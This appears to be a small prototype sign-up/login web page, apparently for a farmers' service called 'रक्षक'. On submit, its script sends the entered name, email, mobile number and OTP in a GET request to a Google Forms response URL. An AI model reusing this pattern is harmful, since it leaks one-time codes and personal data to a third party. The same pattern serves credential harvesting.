<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>रक्षक ~ Login Page</title>
    <!-- Include Bootstrap CSS -->
    <link
      rel="stylesheet"
      href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
    />
    <link
      rel="icon"
      href="https://cdn.inc42.com/wp-content/uploads/2022/06/farmers-feature-760x570.png"
      type="image/png"
    />
    <style>
      .divider:after,
      .divider:before {
        content: "";
        flex: 1;
        height: 1px;
        background: #eee;
      }
    </style>
  </head>
  <body>
    <section class="vh-100">
      <div class="container py-5 h-100">
        <div class="row d-flex align-items-center justify-content-center h-100">
          <div class="col-md-8 col-lg-7 col-xl-6">
            <img
              src="https://cdn.inc42.com/wp-content/uploads/2022/06/farmers-feature-760x570.png"
              class="img-fluid border border-primary border-5 rounded-start"
              alt="Phone image"
            />
          </div>
          <div class="col-md-7 col-lg-5 col-xl-5 offset-xl-1">
            <div class="card">
              <div class="card-header">Sign-Up</div>
              <div class="card-body">
                <form id="loginForm">
                  <div class="form-group">
                    <div class="form-group">
                      <label for="name">Name</label>
                      <input
                        type="text"
                        class="form-control"
                        id="nameInput"
                        placeholder="Enter your name"
                        required
                      />
                    </div>
                    <div class="form-group">
                      <label for="mail">E-Mail ID</label>
                      <input
                        type="email"
                        class="form-control"
                        id="emailInput"
                        placeholder="Enter your Email-ID"
                      />
                    </div>
                    <div class="form-group">
                      <label for="mobile">Mobile Number</label>
                      <input
                        type="tel"
                        class="form-control"
                        id="mobileInput"
                        placeholder="Enter your mobile number"
                        required
                      />
                    </div>
                    <div class="form-group">
                      <label for="otp">OTP</label>
                      <input
                        type="number"
                        class="form-control"
                        id="otpInput"
                        placeholder="Enter OTP"
                        required
                      />
                    </div>
                  </div>
                  <button
                    type="submit"
                    href="javascript:void(0)"
                    onclick="sendResponse()"
                    class="btn btn-primary"
                    id="submit"
                  >
                    Login
                  </button>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
    <!-- Include Bootstrap JS and jQuery -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script>
      // Get values from the input fields and store them in JavaScript variables
var url;
const loginForm = document.getElementById("loginForm");
const submit=document.getElementById("submit");

// Attach an event listener to the form's submit event
loginForm.addEventListener("submit", function (event) {
  event.preventDefault(); // Prevent the default form submission behavior

  // Your custom code to handle form submission here
  // For example, you can call the sendResponse function
  sendResponse();

  // You can also add further actions here if needed

  return false; // Ensure the form submission is canceled
});
      function sendResponse() {
        var name = document.getElementById("nameInput").value;
        name = name.replace(/ /g, "+");
        var mailID = document.getElementById("emailInput").value;

        // Replace "@" with "%40" only in the mailID, not in the name
        mailID = mailID.replace(/@/g, "%40");

        const phoneNumber = document.getElementById("mobileInput").value;
        const otp = document.getElementById("otpInput").value;
        
        url =
          "https://docs.google.com/forms/d/e/1FAIpQLSdR6MkbklaGy7tkzDCJwVpvAInKM2G4KS28qnNeztMHP4ejtA/formResponse?" +
          "&entry.953602603=" +
          name+
          "&entry.1022831272=" +
          phoneNumber +
          "&entry.2093661569=" +
          mailID +
          "&entry.176472869=" +
          otp;
          fetch(url);
        console.log(url);
        submit.innerHTML="Submitted!"

      }
    </script>
  </body>
</html>
